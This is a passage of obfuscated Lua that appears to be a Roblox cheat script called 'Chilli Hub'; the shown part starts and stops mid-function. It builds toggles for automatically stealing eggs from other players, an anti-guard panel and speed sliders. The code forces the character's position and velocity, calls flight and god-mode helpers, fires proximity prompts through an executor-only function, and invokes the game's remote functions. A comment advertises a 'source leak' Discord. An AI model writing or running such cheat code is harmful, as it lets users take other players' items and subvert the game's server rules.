				local isRemoteFunction = rfScrambleTradeInAskState and rfScrambleTradeInAskState:IsA("RemoteFunction")
				local result = nil
				local flag39 = false

				if isRemoteFunction then
					flag39, result = pcall(rfScrambleTradeInAskState.InvokeServer, rfScrambleTradeInAskState)
				end

				if not flag39 or type(result) ~= "table" or type(result.Requirements) ~= "table" then
					if str1.Lab.StockActive() then
						str1.Steal.RiftNeeds = func49()
					end

					return
				end

				str1.Steal.RiftBanner = result.BannerId ~= nil and tostring(result.BannerId) or nil
				local riftRequirements = {}

				if result.Unlocked ~= false and str1.Lab.BannerOk(result.BannerId) then
					for _, requirement in ipairs(result.Requirements) do
						table.insert(riftRequirements, tostring(requirement))
					end
				end

				str1.Steal.RiftRequirements = riftRequirements
				str1.Steal.RiftNeeds = func49()
			end

			tbl2.Add(function()
				if not str1.Steal.RiftPriority or flag38 or os.clock() < n10 then
					return false
				end
				flag38 = true
				n10 = os.clock() + n9

				task.spawn(function()
					pcall(func50)
					flag38 = false
				end)

				return false
			end)

			local function recount()
				if not str1.Steal.RiftPriority then
					return
				end
				local riftNeeds = str1.Steal.RiftNeeds
				local result9 = func49()
				local flag40 = false

				for k in pairs(riftNeeds) do
					if not result9[k] then
						flag40 = true
					end
				end

				for k in pairs(result9) do
					if not riftNeeds[k] then
						flag40 = true
					end
				end

				str1.Steal.RiftNeeds = result9

				if flag40 then
					tbl2.Wake()
				end
			end

			str1.Lab.Recount = recount
			local save2 = tbl1.Save

			if type(save2) == "table" and type(save2.FieldSignal) == "function" then
				for _, item26 in ipairs({ "EggInventory", "Inventory" }) do
					local ok, result = pcall(save2.FieldSignal, item26)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, result2 = pcall(result.Connect, result, function()
							task.defer(recount)
						end)

						if ok2 and result2 then
							func4(function()
								pcall(function()
									result2:Disconnect()
								end)
							end)
						end
					end
				end
			end

			str1.Lab.ForceSteal = function()
				n10 = 0
			end

			value41 = obj9:CreateToggle({
				Name = "Steal Missing Lab Eggs",
				Default = false,
				Callback = function()
					str1.Steal.RiftPriority = str1.Toggle(value41, false) == true
					n10 = 0

					if not str1.Steal.RiftPriority then
						str1.Steal.RiftNeeds = {}
					end

					task.delay(0.3, function()
						pcall(str1.Lab.FixPickers)
					end)

					tbl2.Wake()
				end,
			})

			obj9:CreateToggle({
				Name = "Skip Owned Lab Eggs",
				Note = "Only for the current recipe",
				Default = true,
				ShowWhen = value41,
				Callback = function(value)
					str1.Lab.SkipOwned = value ~= false
					pcall(recount)
				end,
			})

			local tbl66 = {}
			local byName2 = {}

			for _, item27 in ipairs(str1.Lab.BannerList()) do
				table.insert(tbl66, item27.Name)
				byName2[item27.Name] = item27.Id
			end

			obj9:CreateMultiDropdown({
				Name = "Stock Lab Eggs For",
				Note = "Collects eggs for these banners even before they open",
				Options = tbl66,
				Default = {},
				ShowWhen = value41,
				Callback = function(value)
					local stock = {}

					if type(value) == "table" then
						for k, value46 in pairs(value) do
							k = value46 == true and type(k) == "string" and k
							local flag41

							if k then
								flag41 = k
							else
								flag41 = type(value46) == "string" and value46
							end

							flag41 = flag41 or nil

							if flag41 and byName2[flag41] then
								stock[byName2[flag41]] = true
							end
						end
					end

					str1.Lab.Stock = stock
					n10 = 0

					task.spawn(function()
						pcall(recount)
					end)

					tbl2.Wake()
				end,
			})

			local ok, result = pcall(function()
				local directory = tbl1.Assets and tbl1.Assets.Directory
				local tbl67 = { Biohazard = "Biohazard", Experimental = "Experimental", UnstableDNA = "Unstable DNA" }

				str1.Lab.LabelsFor = function(param34)
					local tbl68 = {}
					local tbl69 = {}
					str1.Lab.PoolOf(param34)
					local tbl70 = str1.Lab.PoolLists[param34] or {}

					for _, item28 in ipairs(tbl70) do
						local flag42 = type(directory) == "table" and directory[item28.Category] or nil
						local n11 = item28.Share * 100
						local num9 = n11 < 1 and "<1%" or string.format("%d%%", math.floor(n11 + 0.5))
						local formatted2 = string.format("%s Egg (%s)", tostring(type(flag42) == "table" and flag42.DisplayName or item28.Category), num9)

						if tbl69[formatted2] then
							local format = string.format
							local func51 = tostring
							local displayName = type(flag42) == "table" and flag42.DisplayName or item28.Category
							local category = item28.Category
							formatted2 = format("%s Egg [%s] (%s)", func51(displayName), category, num9)
						end

						table.insert(tbl68, formatted2)
						tbl69[formatted2] = item28.Category
					end

					return tbl68, tbl69
				end

				for _, item29 in ipairs(str1.Lab.BannerList()) do
					local id = item29.Id
					local list10, value47 = str1.Lab.LabelsFor(id)
					local tbl71 = { CategoryOf = value47 }
					str1.Lab.Pickers[id] = tbl71
					local tbl72 = {}

					for i = 1, math.min(5, #list10) do
						table.insert(tbl72, list10[i])
					end

					tbl71.Handle = obj9:CreateMultiDropdown({
						Name = (tbl67[id] or item29.Name) .. " Lab Eggs",
						Options = list10,
						Default = tbl72,
						ShowWhen = value41,
						Callback = function(value)
							local tbl73 = {}

							if type(value) == "table" then
								for k, value48 in pairs(value) do
									k = value48 == true and type(k) == "string" and k or type(value48) == "string" and value48
									local flag43 = k or nil

									if flag43 and tbl71.CategoryOf[flag43] then
										tbl73[tbl71.CategoryOf[flag43]] = true
									end
								end
							end

							str1.Lab.StockEggs[id] = next(tbl73) ~= nil and tbl73 or nil
							n10 = 0

							task.spawn(function()
								pcall(recount)
							end)

							tbl2.Wake()
						end,
					})
				end
			end)

			if not ok then
				warn("[Chilli Hub] Lab egg pickers failed: " .. tostring(result))
			end

			task.spawn(function()
				pcall(str1.Lab.RefreshPools)
			end)

			obj9:CreateSlider({
				Name = "Stock Per Egg",
				Min = 1,
				Max = 30,
				Default = 3,
				Increment = 1,
				Unit = "",
				ShowWhen = value41,
				Callback = function(value)
					str1.Lab.StockPer = math.clamp(math.floor(tonumber(value) or 3), 1, 30)

					task.spawn(function()
						pcall(recount)
					end)
				end,
			})
		end

		do
			local n9 = 5
			local n10 = 5
			local n11 = 60
			local value49 = nil
			local n12 = 0
			local n13 = 0
			local flag44 = false
			local tbl74 = {}

			local function func52()
				local save2 = tbl1.Save

				if type(save2) == "table" and type(save2.Get) == "function" then
					local ok, result = pcall(save2.Get)
					if ok and type(result) == "table" then
						return result
					end
				end

				return nil
			end

			local function func53()
				local result10 = func52()
				local directory = tbl1.Areas and tbl1.Areas.Directory
				local directory2 = tbl1.Assets and tbl1.Assets.Directory
				if not result10 or type(directory) ~= "table" or type(directory2) ~= "table" then
					return
				end
				local index = type(result10.Index) == "table" and result10.Index or {}
				local tbl75 = {}
				local func54 = pairs
				local inventory = result10.Inventory or {}

				for _, value50 in func54(inventory) do
					if type(value50) == "table" and value50.Category ~= nil then
						tbl75[tostring(value50.Category)] = true
					end
				end

				local func55 = pairs
				local eggInventory = result10.EggInventory or {}

				for _, value51 in func55(eggInventory) do
					if type(value51) == "table" and value51.AssetCategory ~= nil then
						tbl75[tostring(value51.AssetCategory)] = true
					end
				end

				local tbl76 = {}

				for _, value52 in pairs(directory) do
					local flag45 = type(value52) == "table" and type(value52.Rarity) == "table"

					if flag45 then
						flag45 = tonumber(value52.Rarity.RarityNumber or value52.Rarity.Rank)
					end

					flag45 = flag45 or 0
					local func56 = pairs
					local dropTable = type(value52) == "table" and value52.DropTable or {}

					for _, value53 in func56(dropTable) do
						local flag46 = type(value53) == "table" and value53[1] or nil
						local n14 = type(value53) == "table" and tonumber(value53[2]) or 0
						local flag47 = flag46 ~= nil and directory2[flag46] or nil

						if type(flag47) == "table" and n14 > 0 and flag47.DontRoll ~= true then
							local str5 = tostring(flag46)

							if index[flag46] ~= true and not tbl75[str5] and (tbl76[str5] == nil or flag45 > tbl76[str5]) then
								tbl76[str5] = flag45
							end
						end
					end
				end

				tbl56 = tbl76
			end

			local function func57(childName, ...)
				local obj20 = networking:FindFirstChild(childName)
				if not obj20 or not obj20:IsA("RemoteFunction") then
					return false
				end
				local ok, result = pcall(obj20.InvokeServer, obj20, ...)
				return ok and result ~= false
			end

			local function func58(param35, list11)
				local tbl77 = {}
				if type(param35) ~= "table" then
					return tbl77
				end

				for _, item30 in ipairs(list11) do
					local tbl78 = param35

					for _, item31 in ipairs(item30) do
						tbl78 = type(tbl78) == "table" and tbl78[item31] or nil
					end

					local func59 = ipairs
					tbl78 = type(tbl78) == "table" and tbl78 or {}

					for _, value54 in func59(tbl78) do
						if type(value54) == "table" and value54.AssetId ~= nil then
							table.insert(tbl77, value54.AssetId)
						end
					end
				end

				return tbl77
			end

			local tbl79 = {
				{
					Id = "LimitedEgg",
					Gear = "GravityDisruptor",
					Module = "LimitedEgg",
					Lists = { { "Entries" }, { "MechaReroll", "Entries" } },
				},
				{
					Id = "BrainrotEgg",
					Gear = "BeeLauncher",
					Module = "BrainrotEgg",
					Lists = { { "Entries" } },
				},
				{
					Id = "MonsterEgg",
					Gear = "BeeLauncher",
					Module = "MonsterEgg",
					Lists = { { "Entries" }, { "MechaEntries" } },
				},
			}

			local function func60()
				local result11 = func52()
				if not result11 then
					return
				end
				local index = type(result11.Index) == "table" and result11.Index or {}
				local indexClaimedCategories = type(result11.IndexClaimedCategories) == "table" and result11.IndexClaimedCategories or {}

				for k, value55 in pairs(index) do
					if value55 == true and indexClaimedCategories[k] ~= true then
						func57("RF/Codex/AskRedeemAll")
						break
					end
				end

				local gearInventory = type(result11.GearInventory) == "table" and result11.GearInventory or {}

				for _, item32 in ipairs(tbl79) do
					local flag48 = (tonumber(gearInventory[item32.Gear]) or 0) <= 0

					if flag48 then
						flag48 = os.clock() >= (tbl74[item32.Id] or 0)
					end

					if flag48 then
						local list12 = func58(tbl1[item32.Module], item32.Lists)
						local len2 = #list12 > 0

						for _, item33 in ipairs(list12) do
							if index[item33] ~= true then
								len2 = false
								break
							end
						end

						if len2 then
							tbl74[item32.Id] = os.clock() + n11
							func57("RF/Codex/AskRedeemLimitedEgg", item32.Id)
						end
					end
				end
			end

			tbl2.Add(function()
				local now = os.clock()

				if flag36 and now >= n12 then
					n12 = now + n9
					pcall(func53)
				end

				if not flag44 and now >= n13 and str1.Toggle(str1.IndexClaimHandle, false) then
					flag44 = true
					n13 = now + n10

					task.spawn(function()
						pcall(func60)
						flag44 = false
					end)
				end

				return false
			end)

			value49 = obj9:CreateToggle({
				Name = "Steal Missing Index Eggs",
				Note = "Also steal eggs missing from your index, highest area first",
				Default = false,
				Callback = function()
					flag36 = str1.Toggle(value49, false) == true
					n12 = 0

					if not flag36 then
						tbl56 = {}
					end

					tbl2.Wake()
				end,
			})

			str1.IndexClaimRestart = function()
				n13 = 0
				tbl2.Wake()
			end
		end

		str1.Steal.PriorityHandle = obj9:CreateDropdown({
			Name = "Steal Priority",
			Options = list2,
			Default = list2[4],
			Callback = function(value)
				if table.find(list2, value) then
					flag1 = value

					if type(str1.ResortSteal) == "function" then
						str1.ResortSteal()
					end
				end
			end,
		})

		str1.SafeCarry.RunHandle = obj9:CreateSlider({
			Name = "Tween Speed",
			Note = "Over 100% may glitch",
			Min = 50,
			Max = 120,
			Default = 100,
			Increment = 1,
			Unit = "%",
			Callback = function(value)
				str1.SafeCarry.RunSpeed = math.clamp(tonumber(value) or 100, 50, 120) / 100
			end,
		})

		obj9:CreateSlider({
			Name = "Carry Speed",
			Min = 80,
			Max = 120,
			Default = 100,
			Increment = 1,
			Unit = "%",
			Callback = function(value)
				str1.SafeCarry.CarryScale = math.clamp(tonumber(value) or 100, 80, 120) / 100
			end,
		})

		str1.BossPortalUp = function()
			return workspace:FindFirstChild("ScrambleArenaPortal") ~= nil
		end

		str1.AntiGuard.Handle = obj2:CreateState({ Name = "Anti Guard Enabled", Default = false })

		pcall(function()
			str1.AntiGuard.Enabled = str1.AntiGuard.Handle:Get() == true
		end)

		pcall(function()
			str1.AntiGuard.Handle:Subscribe(function(enabled2)
				if type(enabled2) ~= "boolean" then
					enabled2 = str1.AntiGuard.Handle:Get()
				end

				str1.AntiGuard.Enabled = enabled2 == true

				if str1.StealPanelSync then
					pcall(str1.StealPanelSync)
				end

				if str1.AntiGuard.Render and str1.UiDefer then
					str1.UiDefer(function()
						pcall(str1.AntiGuard.Render, false)
					end)
				end
			end)
		end)

		str1.AntiGuard.PanelHandle = obj9:CreateToggle({
			Name = "Anti Guard Panel",
			Default = true,
			Callback = function(panelShown)
				if type(panelShown) ~= "boolean" then
					panelShown = str1.Toggle(str1.AntiGuard.PanelHandle, true)
				end

				str1.AntiGuard.PanelShown = panelShown

				if str1.AntiGuard.ShowPanel then
					pcall(str1.AntiGuard.ShowPanel, panelShown)
				end
			end,
		})

		local flag49
		flag49 = nil
		local value56
		value56 = nil
		local value57
		value57 = nil
		local str6
		str6 = "None"
		local flag50
		flag50 = "Idle"
		local flag51
		flag51 = false
		local n9
		n9 = 0
		local tbl80
		tbl80 = {}
		local n10
		n10 = 20
		local uid
		uid = nil
		local func61

		func61 = function(flag52)
			return flag52 ~= n9 or not str1.Toggle(flag49, false)
		end

		local func62

		do
			local tbl81 = {}

			local function func63(num10)
				if type(num10) ~= "number" or tbl81[num10] then
					return
				end
				tbl81[num10] = true

				task.delay(math.max(0, num10 - workspace:GetServerTimeNow()) + 0.05, function()
					tbl81[num10] = nil
					tbl2.Wake()
				end)
			end

			local n11 = 0

			func62 = function()
				local areaEggCycle = tbl1.AreaEggCycle
				if type(areaEggCycle) ~= "table" then
					return nil
				end

				local ok, result, result2, result3, result4 = pcall(function()
					local serverTimeNow = workspace:GetServerTimeNow()
					local nextResetTime = areaEggCycle.NextResetTime
					return serverTimeNow, areaEggCycle.IsNightPhase(serverTimeNow), areaEggCycle.NextNightTime(serverTimeNow), nextResetTime(serverTimeNow)
				end)

				if not ok or type(result4) ~= "number" then
					return nil
				end

				if result2 == true then
					n11 = result4 + str1.WallOpenDelay()
					func63(n11)
					return n11, "night", result
				end

				if str1.WallSealed() then
					func63(result + 0.3)
					return math.max(n11, result), "wall", result
				end

				if type(result3) == "number" and result3 > result then
					func63(result3)
				end

				return nil
			end
		end

		do
			local areaEggResetWall = tbl1.AreaEggResetWall
			local changed = type(areaEggResetWall) == "table" and areaEggResetWall.Changed or nil

			if changed and type(changed.Connect) == "function" then
				local ok, result = pcall(function()
					return changed:Connect(function()
						tbl2.Wake()
					end)
				end)

				if ok and result then
					func4(function()
						pcall(function()
							result:Disconnect()
						end)
					end)
				end
			end
		end

		local n11
		n11 = 8
		local tbl82
		tbl82 = nil
		local n12
		n12 = 0
		local func64, func65, func66

		local function func67(flag53)
			local tbl83 = {}
			local str7 = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
			local eggState = tbl1.EggState

			if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
				task.spawn(function()
					local ok, result = pcall(eggState.ReadFieldEggs)

					if ok and type(result) == "table" and type(result.Records) == "table" then
						for _, record in pairs(result.Records) do
							local flag54 = type(record) == "table" and type(record.Uid) == "string"
							local flag55

							if flag54 then
								flag55 = not (flag53 and string.sub(record.Uid, 1, #str7) == str7)
							else
								flag55 = flag54
							end

							if flag55 then
								tbl83[record.Uid] = true
							end
						end
					end
				end)
			end

			return tbl83
		end

		func64 = function()
			if tbl82 == nil then
				return false
			end

			if str1.IsNight() then
				return true
			end

			if n12 == math.huge then
				n12 = os.clock() + n11
			end

			return false
		end

		func65 = function()
			if tbl82 and n12 == math.huge then
				return
			end
			tbl82 = func67(true)
			n12 = math.huge
			table.clear(tbl40)
			table.clear(tbl42)
			table.clear(tbl41)
			table.clear(tbl80)
			uid = nil
		end

		func66 = function()
			if not tbl82 then
				return false
			end

			if n12 <= os.clock() then
				tbl82 = nil
				return false
			end
			local result12 = func67()
			if next(result12) == nil then
				return true
			end
			local flag56 = false
			local flag57 = false

			for k in pairs(result12) do
				if tbl82[k] then
					flag56 = true
				else
					flag57 = true
				end
			end

			if not flag56 then
				tbl82 = nil
				return false
			end
			return not flag57
		end

		local func68

		do
			local function func69(param36)
				local directory = tbl1.Assets and tbl1.Assets.Directory
				local flag58 = type(directory) == "table" and directory[tostring(param36)] or nil
				local rarity = type(flag58) == "table" and type(flag58.Rarity) == "table" and flag58.Rarity or nil
				local tbl84 = {}

				if rarity then
					rarity = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				tbl84.RarityNumber = rarity or 0
				tbl84.EarningRate = type(flag58) == "table" and tonumber(flag58.EarningRate) or 0
				return tbl84
			end

			local function func70(flag59)
				local mutations = tbl1.Mutations

				if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
					local ok, result = pcall(mutations.EarningsFor, type(flag59) == "table" and flag59 or {})
					if ok and type(result) == "number" then
						return result
					end
				end

				return 1
			end

			local function func71(param37, param38)
				local eggRecords = tbl1.EggRecords

				if type(eggRecords) == "table" and type(eggRecords.WeightKgForScale) == "function" then
					local ok, result = pcall(eggRecords.WeightKgForScale, param37, param38)
					if ok and type(result) == "number" then
						return result
					end
				end

				return 0
			end

			func68 = function(flag60, flag61)
				local records = nil
				local eggState = tbl1.EggState

				if type(eggState) == "table" and type(eggState.ReadFieldEggs) == "function" then
					task.spawn(function()
						local ok, result = pcall(eggState.ReadFieldEggs)

						if ok and type(result) == "table" and type(result.Records) == "table" and next(result.Records) ~= nil then
							records = result.Records
						end
					end)
				end

				if not records then
					local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
					if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
						return {}
					end
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
					records = ok and type(result) == "table" and result.Records or nil
				end

				if type(records) ~= "table" then
					return {}
				end
				local tbl85 = {}
				local tbl86 = {}

				for _, record in pairs(records) do
					local uid2 = type(record) == "table" and record.Uid or nil

					if uid2 and record.State ~= "Claimed" then
						tbl86[uid2] = true
					end

					local state2 = record.State == "Carried" and flag61 == true and flag60 ~= true and not (str1.Steal.Carrying and uid2 == str1.Steal.CarryUid)

					if uid2 then
						state2 = record.State == "Slot" or record.State == "Dropped" or state2
					else
						state2 = uid2
					end

					local flag62 = uid2 and tbl40[uid2] or nil
					local flag63 = uid2 and tbl41[uid2] == true or false
					local flag64 = flag60 ~= true and flag36 and uid2 and tbl56[tostring(record.AssetCategory)] or nil
					local flag65 = flag60 ~= true and str1.Steal.RiftPriority == true and uid2 ~= nil and str1.Steal.RiftNeeds[tostring(record.AssetCategory)] == true
					local flag66 = flag60 == true or flag62 ~= nil or flag63 or flag65 or flag64 ~= nil or tbl38[tostring(record.AreaId)] == true
					local flag67 = flag60 ~= true and flag62 == nil and tbl42[uid2] == true
					local flag68 = tbl82 ~= nil and tbl82[uid2] == true
					state2 = state2 and typeof(record.BottomCFrame) == "CFrame"

					if state2 then
						state2 = (tbl80[uid2] or 0) <= os.clock()
					end

					if state2 and flag66 and not flag67 and not flag68 then
						local assetCategory2 = func69(record.AssetCategory)
						local assetCategory3 = tostring(record.AssetCategory)
						local flag69 = assetCategory2.RarityNumber >= n5
						local flag70 = next(tbl39) == nil or tbl39[assetCategory3] == true
						local n13 = tonumber(record.AssetScale) or 1
						local mutations3 = func70(record.Mutations)
						local n14 = n13 > 5 and (n13 / 5) ^ 1.2 * 19.637875755794113 or n13 ^ 1.85
						local flag71 = n6 <= 0 or assetCategory2.EarningRate * n14 * mutations3 >= n6
						flag71 = flag69 and flag70 and flag71
						local flag72 = flag65 and not flag71 and not flag63 and flag62 == nil and flag64 == nil
						local lastSkip = flag60 ~= true and str1.SafeCarry.Unsafe({ Uid = uid2, Category = assetCategory3 })

						if lastSkip then
							tbl40[uid2] = nil
							tbl41[uid2] = nil
							str1.SafeCarry.LastSkip = lastSkip
						elseif flag60 == true or flag62 or flag63 or flag65 or flag64 ~= nil or flag71 then
							table.insert(tbl85, {
								Uid = uid2,
								Category = assetCategory3,
								Scale = n13,
								State = record.State,
								Rarity = assetCategory2.RarityNumber,
								Weight = func71(record.AssetCategory, n13),
								Mutation = mutations3,
								Value = assetCategory2.EarningRate * n14 * mutations3,
								CFrame = record.BottomCFrame,
								AreaId = tostring(record.AreaId),
								Rift = flag60 ~= true and flag65,
								RiftOnly = flag60 ~= true and flag72,
								RiftNow = flag60 ~= true and flag72 and str1.Steal.RiftCurrent[assetCategory3] == true,
								Index = flag64,
								Forced = flag60 ~= true and flag62 and flag62.At or nil,
								Priority = flag60 ~= true and flag63,
							})
						end
					end
				end

				if next(tbl86) ~= nil then
					for k in pairs(tbl40) do
						if not tbl86[k] then
							tbl40[k] = nil
						end
					end

					for k in pairs(tbl41) do
						if not tbl86[k] then
							tbl41[k] = nil
						end
					end

					for k in pairs(tbl42) do
						if not tbl86[k] then
							tbl42[k] = nil
						end
					end
				end

				table.sort(tbl85, function(param39, param40)
					if param39.Forced ~= nil ~= param40.Forced ~= nil then
						return param39.Forced ~= nil
					end

					if param39.Forced and param40.Forced and param39.Forced ~= param40.Forced then
						return param39.Forced < param40.Forced
					end

					if param39.Priority ~= param40.Priority then
						return param39.Priority == true
					end

					if param39.RiftOnly ~= param40.RiftOnly then
						return param40.RiftOnly == true
					end

					if param39.RiftOnly and param39.RiftNow ~= param40.RiftNow then
						return param39.RiftNow == true
					end

					if param39.Index ~= nil ~= param40.Index ~= nil then
						return param39.Index ~= nil
					end

					if param39.Index and param40.Index and param39.Index ~= param40.Index then
						return param39.Index > param40.Index
					end

					if flag1 == list2[2] and param39.Weight ~= param40.Weight then
						return param39.Weight > param40.Weight
					end

					if flag1 == list2[3] and param39.Mutation ~= param40.Mutation then
						return param39.Mutation > param40.Mutation
					end

					if flag1 == list2[4] and param39.Value ~= param40.Value then
						return param39.Value > param40.Value
					end

					if flag1 == list2[5] and param39.Value ~= param40.Value then
						return param39.Value < param40.Value
					end

					if param39.Rarity ~= param40.Rarity then
						return param39.Rarity > param40.Rarity
					end

					if param39.Value ~= param40.Value then
						return param39.Value > param40.Value
					end
					return tostring(param39.Uid) < tostring(param40.Uid)
				end)

				return tbl85
			end
		end

		local n13
		n13 = 6
		local func72, func73, func74, func75, func76

		do
			local value58 = nil
			local connection = nil

			func72 = function(part2, num11, num12, num13, flag73)
				local n14 = num11 - part2.Position
				local magnitude = n14.Magnitude
				local n15 = math.max(num13, 0.0041666666666666666)
				local vector = Vector3.zero

				if magnitude > 0.01 then
					vector = n14.Unit * math.min(num12, magnitude / n15)
				end

				local assemblyLinearVelocity = vector + Vector3.new(0, workspace.Gravity * n15 * 0.5, 0)

				if magnitude > 2 then
					if not flag73.mark then
						flag73.mark = magnitude
						flag73.clock = 0
					end

					flag73.clock = flag73.clock + num13

					if flag73.clock >= 0.4 then
						if flag73.mark - magnitude < num12 * 0.1 then
							pcall(function()
								part2.CFrame = part2.CFrame + n14.Unit * math.min(magnitude, num12 * n15)
							end)
						end

						flag73.mark = magnitude
						flag73.clock = 0
					end
				else
					flag73.mark = nil
				end

				pcall(function()
					part2.AssemblyLinearVelocity = assemblyLinearVelocity
					part2.AssemblyAngularVelocity = Vector3.zero
				end)

				return magnitude <= 0.5
			end

			func73 = function()
				local value59 = str1.Root()

				if value59 then
					pcall(function()
						value59.AssemblyLinearVelocity = Vector3.zero
						value59.AssemblyAngularVelocity = Vector3.zero
					end)
				end
			end

			local connection2 = nil
			local tbl87 = {}

			func74 = function()
				value58 = nil

				if connection then
					connection:Disconnect()
					connection = nil
				end

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end
			end

			func75 = function()
				local num14 = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				return num14 ~= nil and num14 > workspace:GetServerTimeNow()
			end

			local flag74 = false

			local function func77()
				if flag74 then
					return true
				end
				return true
			end

			func76 = function(flag75, flag76)
				value58 = flag75
				flag74 = flag76 == true
				if connection or not flag75 then
					return
				end
				tbl87 = {}

				connection = RunService.Heartbeat:Connect(function()
					if not value58 or func77() or func75() or str1.AntiGuard.Busy then
						return
					end
					local flag77 = str1.Root()
					if not flag77 then
						return
					end

					pcall(function()
						local rotation = flag77.CFrame.Rotation
						flag77.CFrame = CFrame.new(value58) * rotation
						flag77.AssemblyLinearVelocity = Vector3.zero
						flag77.AssemblyAngularVelocity = Vector3.zero
					end)
				end)

				connection2 = RunService.PreSimulation:Connect(function(deltaTime)
					if not value58 or not func77() or func75() or str1.AntiGuard.Busy then
						return
					end
					local value60 = str1.Root()

					if value60 then
						func72(value60, value58, 400, deltaTime, tbl87)
					end
				end)
			end
		end

		func4(func74)
		local func78

		func78 = function()
			func74()
			str1.EndFlight()
			str1.GodMode(false)
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.PlatformStand = false
			end
		end

		local n14, func79, func80

		do
			local n15 = 1.5
			n14 = 0.6

			local function func81(param41, param42)
				local x = param42.X
				return (Vector3.new(param41.X, 0, param41.Z) - Vector3.new(x, 0, param42.Z)).Magnitude
			end

			local function func82(obj21)
				local ok, result = pcall(function()
					return obj21:GetPivot().Position
				end)

				return ok and result or nil
			end

			func79 = function(part3, flag78, param43)
				local position3 = func81(part3.Position, param43)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")

				if areaEggSlotsClient then
					for _, child in ipairs(areaEggSlotsClient:GetChildren()) do
						if child:IsA("Model") and child.Name ~= flag78 then
							local flag79 = func82(child)
							if flag79 and func81(flag79, part3.Position) + n15 < position3 then
								return false
							end
						end
					end
				end

				for _, child in ipairs(workspace:GetChildren()) do
					if child:IsA("Model") and child.Name ~= flag78 and #child.Name == 32 and child:FindFirstChild("Hitbox") then
						local flag80 = func82(child)
						if flag80 and func81(flag80, part3.Position) + n15 < position3 then
							return false
						end
					end
				end

				return true
			end

			str1.Steal.WrongEgg = function(carryUid)
				local steal = str1.Steal
				if type(carryUid) ~= "string" or not steal.Carrying or steal.CarryUid == carryUid then
					return false
				end
				local eggState = tbl1.EggState

				if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
					pcall(eggState.DropFieldEgg, "PlayerRequest")
				end

				local n16 = 0
				--[[ 𝐒𝐨𝐮𝐫𝐜𝐞 𝐋𝐞𝐚𝐤 :: discord.gg/x7YbZeezpm ]]

				while steal.Carrying and n16 < 1 do
					n16 += RunService.Heartbeat:Wait()
				end

				steal.Carrying = false
				steal.CarryUid = carryUid
				return true
			end

			func80 = function(param44, param45, flag81)
				local n16 = flag81 or 14
				local value61 = nil
				local value62 = nil

				for _, child in ipairs(workspace:GetChildren()) do
					if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
						local carryAreaEgg = child:FindFirstChild("CarryAreaEgg")

						if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") then
							local position4 = func81(child.Position, param45)

							if position4 < n16 then
								n16 = position4
								value61 = carryAreaEgg
								value62 = child
							end
						end
					end
				end

				if not value61 or not value62 then
					return nil
				end

				if type(param44) == "string" and not func79(value62, param44, param45) then
					return nil
				end
				return value61, value62
			end
		end

		local func83

		func83 = function(param46)
			local eggState = tbl1.EggState

			if type(param46) == "string" and type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
				pcall(eggState.CarryFieldEgg, param46)
			end
		end

		local func84

		do
			local function func85()
				local carryUid = str1.Steal.CarryUid
				return type(carryUid) == "string" and carryUid or nil
			end

			local function func86(param47)
				local result13 = func85()
				if not result13 or type(param47) ~= "string" then
					return true
				end
				return result13 == param47
			end

			local function func87(param48)
				if type(param48) ~= "string" then
					return false
				end
				local list13 = func68(false, true)
				if #list13 == 0 then
					return true
				end

				for _, item34 in ipairs(list13) do
					if item34.Uid == param48 then
						return true
					end
				end

				return false
			end

			local function func88(param49)
				local eggState = tbl1.EggState

				if type(eggState) == "table" and type(eggState.DropFieldEgg) == "function" then
					pcall(eggState.DropFieldEgg, "PlayerRequest")
				end

				local n15 = 0

				while str1.Steal.Carrying and n15 < 1 and not func61(param49) do
					n15 += RunService.Heartbeat:Wait()
				end
			end

			func84 = function(param50, param51)
				local n15 = 0

				while not str1.Steal.Carrying and n15 < n14 and not func61(param51) do
					n15 += RunService.Heartbeat:Wait()
				end

				if not str1.Steal.Carrying then
					flag50 = "The egg never reached the hand"
					return false
				end

				if func86(param50) then
					return true
				end
				local result14 = func85()
				if func87(result14) then
					flag50 = "Holding another egg that still matches, delivering it"
					return true
				end
				flag50 = "Wrong egg in hand, dropping it"
				func88(param51)
				return false
			end
		end

		local func89

		func89 = function(part4, param52)
			local eggState = tbl1.EggState
			local position = typeof(part4.CFrame) == "CFrame" and part4.CFrame.Position or nil
			if not position then
				return false
			end
			local n15 = 0
			local huge = math.huge
			local n16 = 0

			while n15 < 1.5 do
				if func61(param52) then
					return false
				end

				if str1.Steal.Carrying and not str1.Steal.WrongEgg(part4.Uid) then
					return true
				end

				if huge >= 0.06 then
					local uid4 = func80(part4.Uid, position)

					if uid4 then
						pcall(function()
							uid4.HoldDuration = 0
						end)

						n16 = 0

						if typeof(fireproximityprompt) == "function" then
							pcall(fireproximityprompt, uid4)
						end
					else
						n16 += 1
						if n16 >= 4 then
							return false
						end

						if type(eggState) == "table" and type(eggState.CarryFieldEgg) == "function" then
							pcall(eggState.CarryFieldEgg, part4.Uid)
						end
					end

					huge = 0
				end

				local result = RunService.Heartbeat:Wait()
				n15 += result
				huge += result
			end

			return str1.Steal.Carrying == true
		end

		local func90

		local value63 = func2(function()
			return ReplicatedStorage.Shared.Modules.Ragdoll
		end)

		func90 = function()
			local character = localPlayer.Character

			if type(value63) == "table" and type(value63.IsRagdolled) == "function" then
				local ok, result = pcall(value63.IsRagdolled, character)
				if ok and result == true then
					return true
				end
			end

			local num15 = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
			if num15 and num15 > workspace:GetServerTimeNow() then
				return true
			end
			character = character and character:FindFirstChildOfClass("Humanoid")
			if character then
				local state = character:GetState()
